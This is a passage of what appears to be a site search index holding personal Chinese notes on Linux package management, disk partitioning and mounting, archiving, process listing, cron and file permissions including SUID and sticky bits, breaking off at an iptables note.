\u4f7f\u7528\u7684\u662f\u5143\u6570\u636e\u7f13\u5b58\uff0c\u5b83\u4f1a\u5b9a\u671f\u4ece\u8fdc\u7a0b\u5b58\u50a8\u5e93\u4e0b\u8f7d\u6700\u65b0\u7684\u5143\u6570\u636e\u4fe1\u606f\uff0c\u800c\u4e0d\u9700\u8981\u7528\u6237\u624b\u52a8\u8fd0\u884c\u989d\u5916\u7684\u547d\u4ee4\u6765\u66f4\u65b0\u8f6f\u4ef6\u5305\u5217\u8868\u3002\u8fd9\u610f\u5473\u7740 yum \u5728\u8fd0\u884c yum update \u65f6\u4f1a\u81ea\u52a8\u68c0\u67e5\u5e76\u4f7f\u7528\u6700\u65b0\u7684\u8f6f\u4ef6\u5305\u4fe1\u606f\u3002 \u8fd9\u79cd\u8bbe\u8ba1\u5dee\u5f02\u662f\u56e0\u4e3aapt \u548c yum \u7684\u8bbe\u8ba1\u54f2\u5b66\u548c\u80cc\u540e\u7684\u53d1\u884c\u7248\u4e4b\u95f4\u7684\u5dee\u5f02\uff0c\u5b83\u4eec\u7684\u76ee\u6807\u662f\u4e3a\u4e0d\u540c\u7684 Linux \u53d1\u884c\u7248\u63d0\u4f9b\u8f6f\u4ef6\u5305\u7ba1\u7406\u3002</p> <p>\u5217\u51fa\uff08\u5df2\u5b89\u88c5\uff09\u7684\u8f6f\u4ef6\u5305\uff1a<code>apt list [--installed]</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#linuxredhat_1","title":"Linux\u53d1\u884c\u7248#Redhat\u7cfb\u5217","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#rpmred-hat-package-manager","title":"rpm\uff08Red-Hat Package Manager\uff09","text":"<ul> <li>RPM \u5305\u683c\u5f0f</li> <li>\u63a8\u8350\u7528yum\uff08\u540e\u88ab<code>dnf</code>\u66ff\u4ee3\uff09\u2014\u2014YUM\u662f\u5efa\u7acb\u5728 RPM \u57fa\u7840\u4e4b\u4e0a\u7684\u9ad8\u7ea7\u5305\u7ba1\u7406\u5de5\u5177</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#yumyellowdog-updater-modified","title":"yum\uff08Yellowdog Updater Modified\uff09","text":"<p>\u89e3\u51b3rpm\u7e41\u7410\u7684\u5305\u4f9d\u8d56\u3002</p> <p>\u914d\u7f6e\u6587\u4ef6\uff1a/etc/yum.conf</p> <p>\u5217\u51fa\uff08\u5df2\u5b89\u88c5\uff09\u7684\u8f6f\u4ef6\u5305\uff1a<code>yum list [installed]</code> \u66f4\u65b0\u5305\uff1a<code>yum upgrade &lt;\u5305\u540d&gt;</code>\u3002\u7b49\u4ef7\u4e8e<code>yum update --obsoletes</code>\uff0c\u800c\u7531\u4e8e /etc/yum.conf \u91cc\u9ed8\u8ba4\u6709obsoletes=1\uff0c\u6240\u4ee5\u548cyum update\u6ca1\u533a\u522b\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_30","title":"\u62a5\u9519\u89e3\u51b3","text":"<p>This system is not registered with an entitlement server. You can use subscription-manager to register.</p> <pre><code>vi /etc/yum/pluginconf.d/subscription-manager.conf\nenabled=0\nyum clean all\n</code></pre>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#dnfdandified-yum","title":"dnf\uff08Dandified YUM\uff09","text":"<p>yum\u8fdb\u5316\u7248\u3002\u57fa\u672c\u4e0a\u7cfb\u7edf\u90fd\u914d\u7f6e\u4e86yum\u4e0ednf\u547d\u4ee4\u7684\u4e92\u6362\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_31","title":"\u62d3\u5c55","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#epelextra-packages-for-enterprise-linux","title":"EPEL\uff08Extra Packages for Enterprise Linux\uff09","text":"<ul> <li>epel\u6e90\uff08\u662f\u57fa\u4e8eFedora\u7684\u4e00\u4e2a\u9879\u76ee\uff0c\u4e3a\u201c\u7ea2\u5e3d\u7cfb\u201d\u7684\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u989d\u5916\u7684\u8f6f\u4ef6\u5305)</li> <li>\u4f01\u4e1a\u7248Linux\u9644\u52a0\u8f6f\u4ef6\u5305</li> </ul> <p><code>dnf install epel-release -y</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#pippip-installs-packages","title":"pip\uff08Pip Installs Packages\uff09","text":"<ul> <li>python</li> <li>\u5217\u51fa\u5df2\u5b89\u88c5\u7684\u8f6f\u4ef6\u5305\uff1a<code>pip list</code></li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_32","title":"\u78c1\u76d8\u3001\u5206\u533a\u3001\u6587\u4ef6\u7cfb\u7edf\u7ba1\u7406","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#lsblk","title":"lsblk","text":"<p>list block\u3002</p> <ul> <li>\u5757\u662f\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6700\u5c0f\u5b58\u50a8\u5355\u4f4d</li> <li>\u800c\u6247\u533a\u662f\u78c1\u76d8\u4e2d\u7684\u6700\u5c0f\u5b58\u50a8\u5355\u4f4d</li> </ul> <p>[!NOTE] \u90a3\u4e3a\u4ec0\u4e48\u6709\u4e86\u6247\u533a\uff0c\u8fd8\u8981\u7528\u5757\u63cf\u8ff0\uff1f \u56e0\u4e3a\u7cfb\u7edf\u8bfb\u53d6\u786c\u76d8\u65f6\u662f\u4e00\u6b21\u8bfb\u53d6\u591a\u4e2a\u6247\u533a\uff0c\u5373\u5757\u3002\u5757\u7684\u5927\u5c0f\u5e38\u89c1\u7684\u662f1KB\uff08\u5373\u4e24\u4e2a\u6247\u533a\uff09\u62164KB\u3002</p> <p>\u67e5\u770b\u5757\u5927\u5c0f\uff1a<code>stat file.txt | grep IO</code> ^64f8c7</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#fdisk","title":"fdisk","text":"<p>\u67e5\u770b/\u7ba1\u7406\uff08\u6307\u5b9a\uff09\u78c1\u76d8\u5206\u533a\u3002</p> <ul> <li><code>fdisk -l [/dev/disk_name]</code></li> <li><code>fdisk -l</code>\u663e\u793a\u7684\u5185\u5bb9\u5373<code>fdisk &lt;\u786c\u76d8\uff0c\u5982/dev/sda&gt;</code>\u8fdb\u5165\u63a7\u5236\u53f0\u540e\u6309\u201cp\u201d\u6253\u5370\u7684\u5185\u5bb9\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#gdisk","title":"gdisk","text":"<p>\u4e3b\u8981\u7528\u6765\u5212\u5206\u5bb9\u91cf\u5927\u4e8e4T\u7684\u786c\u76d8\uff08fdisk\u641e\u4e0d\u5b9a\uff09</p> <ul> <li>\u4e24\u79cd\u5206\u533a\u8868\uff1aGPT\u3001MBR\u3002<ul> <li>MBR\u4e0d\u652f\u63014T\u4ee5\u4e0a</li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#mkfs","title":"mkfs","text":"<p><code>mkfs.xfs /dev/&lt;\u5206\u533a\u540d&gt;</code>\uff1a\u5373<code>mkfs -t xfs</code>\uff0c\u5982\u5728sda1\u5206\u533a\u4e0a\u521b\u5efa/\u683c\u5f0f\u5316xfs\u6587\u4ef6\u7cfb\u7edf\u3002</p> <p>\u521b\u5efa\u6587\u4ef6\u7cfb\u7edf\u540e\u5c06\u6b64\u5206\u533a\u6302\u8f7d\u5230\u76ee\u5f55\u6811\uff0c\u4fbf\u53ef\u901a\u8fc7\u8bbf\u95ee\u76ee\u5f55\u4f7f\u7528\u5206\u533a\uff08\u7684\u6587\u4ef6\u7cfb\u7edf\uff09\u3002</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#mount","title":"mount","text":"<p>\u67e5\u770b</p> <p><code>mount</code>\uff1a\u663e\u793a\u76ee\u524d\u6302\u8f7d\u7684\u6240\u6709\u6587\u4ef6\u7cfb\u7edf\uff08\u5176\u4e2d\u6709\u6302\u8f7d\u70b9\u4fe1\u606f\uff09\u3002</p> <p>[!note] \u63a8\u8350findmnt\u547d\u4ee4\u66f4\u6613\u8bfb\uff0c\u6216\u8005 <code>df -hT</code> \u66f4\u7b80\u6d01\u3002</p> <p>\u6302\u8f7d</p> <p>\u5c06\u5206\u533a\u7684\u6587\u4ef6\u7cfb\u7edf\u6620\u5c04\u5230\u6302\u8f7d\u70b9\uff08\u76ee\u5f55\uff09\u3002</p> <p>\u4e34\u65f6\u6302\u8f7d\uff1a<code>mount &lt;\u5206\u533a\u540d&gt; &lt;\u76ee\u5f55\u540d/\u6302\u8f7d\u70b9&gt;</code></p> <p>\u6c38\u4e45\u6302\u8f7d\uff1a\u9700\u8981\u4fee\u6539 <code>/etc/fstab</code> \u6587\u4ef6\uff0c\u5177\u4f53\u4fee\u6539\u683c\u5f0f\u53c2\u7167\uff1afstab\u3002\u4fee\u6539\u540e\u53ef\u4ee5\u7528 <code>mount -a</code> \u5e94\u7528\u914d\u7f6e\uff0c\u7528 <code>df -hT</code> \u786e\u8ba4\u6302\u8f7d\u6210\u529f\u540e\u518d\u91cd\u542f\uff08\u597d\u4e60\u60ef\uff0c\u5426\u5219\u53ef\u80fd\u91cd\u542f\u540e\u53d1\u751f\u8fdb\u4e0d\u53bb\u7b49\u95ee\u9898\uff09\u3002</p> <ul> <li><code>mount -a</code>\uff1a\u5c1d\u8bd5\u6302\u8f7d <code>/etc/fstab</code> \u4e2d\u5c1a\u672a\u6302\u8f7d\u7684\u6587\u4ef6\u7cfb\u7edf\u3002\u7cfb\u7edf\u542f\u52a8\u65f6\u901a\u5e38\u4f1a\u81ea\u52a8\u6267\u884c <code>mount -a</code> \u6765\u6302\u8f7d <code>/etc/fstab</code> \u4e2d\u5b9a\u4e49\u7684\u6587\u4ef6\u7cfb\u7edf\u3002</li> </ul> <p>\u5378\u8f7d</p> <p><code>umount /mnt/my_mount_point</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#findmnt","title":"findmnt","text":"<p><code>findmnt [/path/to/mountpoint | /dev/sdX]</code>\uff1a\u6811\u5f62\u56fe\u663e\u793a\u6302\u8f7d\u70b9\u7684\u4fe1\u606f</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#fstab","title":"fstab","text":"<p>\u914d\u7f6e\u5f00\u673a\u81ea\u52a8\u6302\u8f7d\uff08\u6301\u4e45\u5316\uff09</p> <p>\u53ef\u7528 <code>blkid</code> \u547d\u4ee4\u786e\u8ba4UUID\u3002 \u4e5f\u53ef\u4ee5\u7528\u5206\u533a\u540d\u7f16\u5199\u914d\u7f6e\u6587\u4ef6\uff08\u4f46\u662f\u8981\u6ce8\u610f\u5982\u679c\u78c1\u76d8\u91cd\u63d2\u7684\u8bdd\u53ef\u80fd\u7cfb\u7edf\u8bc6\u522b\u7684\u5206\u533a\u540d\u4f1a\u53d8\uff0c\u800cUUID\u4e0d\u4f1a\uff09\u3002</p> <p>\u8bed\u6cd5\u3001\u683c\u5f0f\uff1a</p> \u8981\u6302\u8f7d\u7684\u5206\u533a\u8bbe\u5907 \u6302\u8f7d\u70b9 \u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b \u6302\u8f7d\u9009\u9879 \u662f\u5426\u5907\u4efd \u662f\u5426\u68c0\u6d4b /dev/sdb1 /sdb1 xfs defaults 0 0 - \u5f04\u5b8c\u91cd\u542f\u2014\u2014\u62c5\u5fc3\u91cd\u542f\u6709\u95ee\u9898\u7684\u8bdd\uff0c\u53ef\u4ee5\u5148 <code>mount -a</code> \u770b\u770b\u6302\u8f7d\u6210\u529f\u6ca1\u518d\u914d\u7f6e <code>fstab</code>\u3002","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#df","title":"df","text":"<p><code>df -hT</code>\uff1a\u67e5\u770b\u6587\u4ef6\u7cfb\u7edf\u4f7f\u7528\u3001\u6302\u8f7d\u72b6\u51b5</p> <ul> <li>\u6587\u4ef6\u7cfb\u7edf\uff1a\u662f\u7528\u4e8e\u7ec4\u7ec7\u548c\u7ba1\u7406\u5b58\u50a8\u6570\u636e\u7684\u65b9\u5f0f\uff0c\u901a\u5e38\u5efa\u7acb\u5728\u903b\u8f91\u5377\u6216\u6807\u51c6\u5206\u533a\u4e4b\u4e0a\u3002</li> <li>tmpfs \u662f\u4e00\u79cd\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff0c\u5b83\u901a\u5e38\u7528\u4e8e\u5c06\u6570\u636e\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u800c\u4e0d\u662f\u786c\u76d8\u4e0a\uff0c\u4ee5\u63d0\u9ad8\u8bbf\u95ee\u901f\u5ea6\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_33","title":"\u538b\u7f29\u548c\u89e3\u538b","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#tar","title":"tar","text":"<ul> <li> <p>-f \u5fc5\u987b\uff0c\u4e14\u5728\u6700\u540e\u3002\u6307\u5b9a\u5305\u7684\u6587\u4ef6\u540d\u3002</p> </li> <li> <p>-c \u521b\u5efa\u5f52\u6863/\u538b\u7f29     \u4f8b\uff1atar -cvf &lt;\u5f52\u6863\u540e\u6587\u4ef6\u540d&gt; &lt;\u8981\u5f52\u6863\u7684\u6587\u4ef6&gt; \u3010tar -cvf jpg.tar *.jpg //\u5c06\u76ee\u5f55\u91cc\u6240\u6709jpg\u6587\u4ef6\u6253\u5305\u6210tar.jpg \u3011</p> </li> <li> <p>-x \u89e3\u538b     \u89e3\u538b\u9009\u9879\uff1a</p> <ul> <li>\u89e3\u538b\u3010.tar.xz\u3011\u65f6\uff1a<code>tar -xvf &lt;filename&gt;</code></li> <li>\u89e3\u538b\u3010.tar.gz\u3011\u65f6\uff1a<code>tar -zxvf &lt;filename&gt;</code><ul> <li>-z \u7528gzip\u538b\u7f29</li> </ul> </li> </ul> </li> <li> <p>-t \u5217\u51fa\u5305\u4e2d\u6587\u4ef6\uff08\u4e0d\u91ca\u653e\u5305\u5185\u6587\u4ef6\uff09</p> </li> <li>-r \u8ffd\u52a0\u5230\u6307\u5b9a\u5305\u672b\u5c3e</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#zip","title":"zip","text":"<p><code>zip -r\u00a0 --symlinks &lt;compressed_file.zip&gt; &lt;file_or_directory&gt;</code></p> <ul> <li>\u5982\u679czip\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa</li> <li>\u5982\u679czip\u6587\u4ef6\u5b58\u5728\uff0c\u5219\u662f\u6dfb\u52a0\u6587\u4ef6/\u76ee\u5f55\u5230zip\u6587\u4ef6\u91cc</li> <li>--symlinks\uff1a\u5373\u201c-y\u201d\uff0c\u7528\u4e8e\u786e\u4fdd\u7b26\u53f7\u94fe\u63a5\u88ab\u6b63\u786e\u5904\u7406\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u8fd9\u4e2a\u9009\u9879\uff0czip \u9ed8\u8ba4\u4f1a\u5c06\u7b26\u53f7\u94fe\u63a5\u6307\u5411\u7684\u5b9e\u9645\u6587\u4ef6\u6dfb\u52a0\u5230\u538b\u7f29\u6587\u4ef6\u4e2d\uff0c\u800c\u4e0d\u662f\u7b26\u53f7\u94fe\u63a5\u672c\u8eab\u3002</li> </ul> <p>\u67e5\u770bZIP\u6587\u4ef6\u5185\u5bb9\uff1a<code>unzip -l file.zip</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#gz","title":"gz","text":"<ul> <li>\u538b\u7f29\u547d\u4ee4\u4e0d\u4fdd\u7559\u6e90\u6587\u4ef6</li> <li>\u89e3\u538b\uff1agunzip</li> </ul> <p>\u67e5\u770b\u672a\u538b\u7f29\u5927\u5c0f\u4e0d\u7528\u5148\u89e3\u538b\uff1a<code>gzip -l &lt;file&gt;</code> \u4e0d\u89e3\u538bzip\u6587\u4ef6\u67e5\u770b\u884c\u6570\uff1a<code>gzip -dc &lt;file&gt; | wc -l</code></p> <ul> <li>-d\uff1a\u89e3\u538b</li> </ul> <p>[!NOTE] <code>zcat</code>\u4e0e<code>gunzip -c</code>\u547d\u4ee4\u7b49\u6548</p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_34","title":"\u8fdb\u7a0b\u7ba1\u7406","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#ps","title":"ps","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#bsd","title":"BSD\u547d\u4ee4\u98ce\u683c\u7684\u53c2\u6570","text":"<p>\u524d\u9762\u4e0d\u52a0\u77ed\u6a2a\u7ebf\u3002</p> <p><code>ps aux</code>\uff1a\u66f4\u5173\u6ce8 CPU \u548c\u5185\u5b58\u4f7f\u7528\u7387\uff0c\u9002\u5408\u7cfb\u7edf\u6027\u80fd\u5206\u6790\u3002 \uff08ax\u4e3a\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u89e3\u9664\u4e86\u201c\u4ec5\u9650\u60a8\u81ea\u5df1\u201d\u548c\u201c\u5fc5\u987b\u6709 tty\u201d\u9650\u5236\uff09</p> <ul> <li><code>ps aux --sort=-%mem | head -n 10</code></li> <li><code>ps aux</code></li> <li><code>ps axjf</code><ul> <li><code>f</code>\uff1a\u8868\u793a\u68ee\u6797\uff0c\u4f1a\u663e\u793a\u8fdb\u7a0b\u6811</li> <li><code>j</code>\uff1ajobs format</li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#unix","title":"Unix\u547d\u4ee4\u98ce\u683c\u7684\u53c2\u6570","text":"<p>\u524d\u9762\u52a0\u4e00\u4e2a\u77ed\u6a2a\u7ebf\u3002</p> <p><code>ps -ef</code>\uff1a\u66f4\u5173\u6ce8\u8fdb\u7a0b\u7684\u7236\u5b50\u5173\u7cfb\uff0c\u9002\u5408\u5206\u6790\u8fdb\u7a0b\u7684\u5c42\u7ea7\u7ed3\u6784\u3002</p> <ul> <li><code>ps -ef</code></li> <li><code>ps -Cf</code><ul> <li><code>-e</code>\uff1a\u6240\u6709\u8fdb\u7a0b</li> <li><code>-f</code>\uff1a\u5b8c\u6574format\u5217\u8868\uff08UID\u3001PID\u3001PPID\u7b49\uff09</li> <li><code>-C</code>\uff1a\u547d\u4ee4\u540d\u79f0\u9009\u62e9</li> <li><code>-l</code>\uff1a\u957f\u683c\u5f0f</li> </ul> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#kill","title":"kill","text":"<p><code>kill &lt;pid&gt;</code></p>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_35","title":"\u65e5\u5fd7\u548c\u76d1\u63a7","text":"<ul> <li> <p>\u65e5\u5fd7\u67e5\u770b\uff1a<code>dmesg</code>, <code>tail</code>, <code>journalctl</code></p> </li> <li> <p>\u6027\u80fd\u76d1\u63a7\uff1a<code>vmstat</code>, <code>iostat</code></p> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_36","title":"\u5907\u4efd\u548c\u6062\u590d","text":"<ul> <li> <p>\u5907\u4efd\u5de5\u5177\uff1a<code>rsync</code>, <code>dump</code>, <code>dd</code></p> </li> <li> <p>\u6062\u590d\u5de5\u5177\uff1a<code>restore</code></p> </li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#_37","title":"\u8c03\u5ea6\u548c\u8ba1\u5212\u4efb\u52a1","text":"","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E5%91%BD%E4%BB%A4/#corn","title":"corn","text":"<p>\u4f7f\u7528<code>crontab -e</code>\u547d\u4ee4\u7f16\u8f91\u5f53\u524d\u7528\u6237\u7684crontab\u6587\u4ef6\u65f6\uff0c\u5b9e\u9645\u4e0a\u7f16\u8f91\u7684\u6587\u4ef6\u901a\u5e38\u5b58\u50a8\u5728<code>/var/spool/cron/crontabs/</code>\u76ee\u5f55\u4e0b\uff0c\u5e76\u4ee5\u8be5\u7528\u6237\u7684\u7528\u6237\u540d\u547d\u540d\u3002</p> <p>\u5728\u8ba1\u7b97\u673a\u672f\u8bed\u4e2d\uff0c\"spool\"\u662f\u4e00\u4e2a\u5386\u53f2\u60a0\u4e45\u7684\u8bcd\u6c47\uff0c\u539f\u610f\u662f\"Simultaneous Peripheral Operations On-line\"\u7684\u7f29\u5199\uff0c\u5b83\u63cf\u8ff0\u4e86\u4e00\u79cd\u5904\u7406\u6570\u636e\u7684\u65b9\u6cd5\uff0c\u8fd9\u79cd\u65b9\u6cd5\u6d89\u53ca\u5230\u5c06\u6570\u636e\u6216\u4efb\u52a1\u4e34\u65f6\u5b58\u50a8\u5728\u4e00\u4e2a\u4e2d\u95f4\u533a\u57df\uff08\u901a\u5e38\u662f\u786c\u76d8\u4e0a\uff09\uff0c\u4ee5\u4fbf\u7a0d\u540e\u6309\u987a\u5e8f\u5904\u7406\u3002\u8fd9\u4e2a\u6982\u5ff5\u6700\u521d\u662f\u4e3a\u4e86\u89e3\u51b3\u65e9\u671f\u8ba1\u7b97\u673a\u8f93\u5165\u8f93\u51fa\u8bbe\u5907\u901f\u5ea6\u4e0e\u8ba1\u7b97\u901f\u5ea6\u4e4b\u95f4\u7684\u4e0d\u5339\u914d\u95ee\u9898\u3002 \u5728\u5f53\u4eca\u7684\u4f7f\u7528\u4e2d\uff0cspool\u8fd9\u4e2a\u8bcd\u4e3b\u8981\u5173\u8054\u4e8e\u6253\u5370\u4f5c\u4e1a\u7684\u7f13\u51b2\uff08\u6253\u5370\u673aspooling\uff09\u548c\u90ae\u4ef6\u7cfb\u7edf\uff0c\u4ee5\u53ca\u5176\u4ed6\u9700\u8981\u961f\u5217\u7ba1\u7406\u7684\u4efb\u52a1\uff0c\u6bd4\u5982cron\u4f5c\u4e1a\u7684\u7ba1\u7406\u3002\u5728\u8fd9\u4e9b\u4e0a\u4e0b\u6587\u4e2d\uff0cspooling\u6307\u7684\u662f\u5c06\u4f5c\u4e1a\u5b58\u50a8\u5230\u4e00\u4e2a\u961f\u5217\u4e2d\uff0c\u7136\u540e\u6309\u7167\u4e00\u5b9a\u7684\u987a\u5e8f\uff08\u901a\u5e38\u662f\u5148\u8fdb\u5148\u51fa\uff09\u8fdb\u884c\u5904\u7406\u3002</p> <p>\u7528\u4e8b\u5148\u5b9a\u4e49\u597d\u7684cron\u4efb\u52a1\u6587\u672c\u66ff\u6362\u5f53\u524d\u7528\u6237\u7684crontab\uff1a <code>corntab [-u username] &lt;crontask.txt&gt;</code></p> <ul> <li><code>-u</code>\uff1a\u5982\u679c\u6709\u6743\u9650\uff0c\u53ef\u6307\u5b9a\u66ff\u6362\u5176\u4ed6\u7528\u6237\u3002</li> </ul>","tags":["IT/Linux"]},{"location":"Resources/Linux/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/","title":"Linux\u6587\u4ef6\u6743\u9650","text":"<p>\u6743\u9650\u6982\u89c8\uff1a</p> <ul> <li>\u201c\u8bfb\u201d\u4f4d\uff1a\u7528\u6237\u53ef\u4ee5\u5217\u51fa\u6587\u4ef6</li> <li>\u201c\u5199\u201d\u4f4d\uff1a\u7528\u6237\u53ef\u4ee5\u5220\u9664\u548c\u521b\u5efa\u65b0\u6587\u4ef6</li> <li>\u201c\u6267\u884c\u201d\u4f4d\uff1a\u7528\u6237\u53ef\u4ee5\u201ccd\u201d\u8fdb\u5165\u8be5\u6587\u4ef6\u5939</li> </ul> <p>\u4e24\u79cd\u8868\u793a\u6cd5\uff1a</p> <ul> <li>bit\u65b9\u5f0f\u5219\u5bf9\u6574\u4e2a\u6587\u4ef6\u5404\u89d2\u8272\u7684\u8bbe\u7f6e</li> <li>ugo\uff08user\uff0cgroup\uff0cother\uff09\u7684\u65b9\u5f0f\u4e00\u822c\u9488\u5bf9\u7279\u5b9a\u89d2\u8272</li> </ul> <p></p>","tags":["IT/Linux","\u6e17\u900f"]},{"location":"Resources/Linux/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/#suid","title":"SUID","text":"<p>\u80cc\u666f\uff1a https://www.jianshu.com/p/2c374f9522bd</p> <ul> <li>RUID\uff08\u5373\u6211\u4eec\u767b\u9646\u65f6\u7684ID\uff09</li> <li>EUID\uff08\u5982\u7ed9root\u7684\u67d0\u6587\u4ef6\u8bbe\u7f6e\u4e86SUID\uff0c\u90a3\u4e48\u6211\u4eec-RUID-\u8fd0\u884c\u8fd9\u4e2a\u6587\u4ef6\u65f6\uff0c\u8fdb\u7a0b\u7684EUID\u5c31\u662froot\uff09</li> <li>SUID\uff08\u8bbe\u7f6e\u7ed9\u6587\u4ef6\u7684\uff09</li> </ul> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7528\u6237\u53d1\u8d77\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u8fdb\u7a0b\u7684\u5c5e\u4e3b\u662f\u8fdb\u7a0b\u7684\u53d1\u8d77\u8005\uff08RUID\uff09\uff0c\u4e5f\u5c31\u662f\u8bf4\u8fd9\u4e2a\u8fdb\u7a0b\u662f\u4ee5\u53d1\u8d77\u8005\u7684\u8eab\u4efd\u8fd0\u884c\u3002\u4f46\u5982\u679c\u8be5\u7a0b\u5e8f\u6709SUID\u6743\u9650\uff0c\u90a3\u4e48\u7a0b\u5e8f\u8fd0\u884c\u4e3a\u8fdb\u7a0b\u65f6\uff0c\u8fdb\u7a0b\u7684\u5c5e\u4e3b\u4e0d\u662f\u53d1\u8d77\u8005\uff0c\u800c\u662f\u8be5\u7a0b\u5e8f\u6587\u4ef6\u7684\u5c5e\u4e3b\uff08EUID\uff09\u3002</p> <p>\u597d\u5904\uff1a\u5bf9\u67d0\u4e9b\u6587\u4ef6\u4e34\u65f6\u8d4b\u4e88\u666e\u901a\u7528\u6237\u4ee5root\u6743\u9650\uff0c\u907f\u514d\u5207\u6362\u5230root\u8fd9\u4e48\u5371\u9669\u7684\u6743\u9650\u6765\u6267\u884c\u64cd\u4f5c\uff08\u6bd4\u5982\u666e\u901a\u7528\u6237\u8981\u6539\u5bc6\u7801\uff09\uff0c\u65b9\u4fbf\u7ba1\u7406\u3002</p> <p>[!NOTE] \u5927\u5199\u7684S \u8868\u793a\u867d\u7136\u8bbe\u7f6e\u4e86SUID\u6743\u9650\uff0c\u4f46\u662f\u6ca1\u6709\u8d4b\u4e88\u201c\u6267\u884c(x)\u201d\u6743\u9650\u3002</p> <p></p> <ul> <li>SUID\uff1a4xxx</li> <li>GUID\uff1a2xxx</li> <li>sticky bits\uff1a1xxx</li> </ul>","tags":["IT/Linux","\u6e17\u900f"]},{"location":"Resources/Linux/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/#sticky","title":"Sticky \u76ee\u5f55\u6743\u9650","text":"<p>\u5c5e\u6027flag\u4e3a\uff1at</p> <ul> <li>\u53ea\u80fd\u7ed9\u76ee\u5f55\uff0c\u5982/tmp\u5c31\u6709</li> <li>\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u5728sticky\u76ee\u5f55\u91cc\u589e\u6539\u6587\u4ef6\uff0c\u4f46\u53ea\u6709\u521b\u5efa\u8005\u548croot\u53ef\u5220\u3002</li> </ul> <p>\u4f8b\uff1a</p> <ul> <li><code>chmod 4777 file</code>\uff1a\u8bbe\u7f6eSUID\u4ee5\u53cafull\u6743\u9650</li> <li><code>chmod +rwx file</code> \u6216 <code>chmod a+rwx file</code>\uff1a\u7ed9file\u7684\"\u6240\u6709\u7528\u6237\"\u589e\u52a0\u8bfb\u3001\u5199\u3001\u6267\u884c\u6743\u9650</li> <li><code>chmod u+srw file</code>\uff1a\u7ed9file\u7684\"user\"\u589e\u52a0SUID\u3001\u8bfb\u3001\u5199\u6743\u9650</li> </ul>","tags":["IT/Linux","\u6e17\u900f"]},{"location":"Resources/Linux/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/#_1","title":"Linux\u6587\u4ef6\u6743\u9650","text":"","tags":["IT/Linux","\u6e17\u900f"]},{"location":"Resources/Linux/iptables/","title":"iptables","text":"<p>2023/07/08</p>"},{"location":"Resources/Linux/iptables/#_1","title":"\u80cc\u666f","text":"<p>\u73a9TryHackMe\u65f6\u9700\u8981\u7528Windows\uff0c\u7136\u800c\u5728Windows\u4e0a\u4f7f\u7528openvpn\u4e0d\u77e5\u9053\u4e3a\u4f55\u65e0\u6cd5\u8fde\u63a5\u76ee\u6807\u7f51\u7edc\u3002\u4e8e\u662f\u5c1d\u8bd5\u4f9d\u65e7\u7528kali\u8fde\u63a5THM\uff0c\u7136\u540e\u5c06Windows\u8bbf\u95eeTHM\u7684\u6d41\u91cf\u8f6c\u53d1\u5230kali\u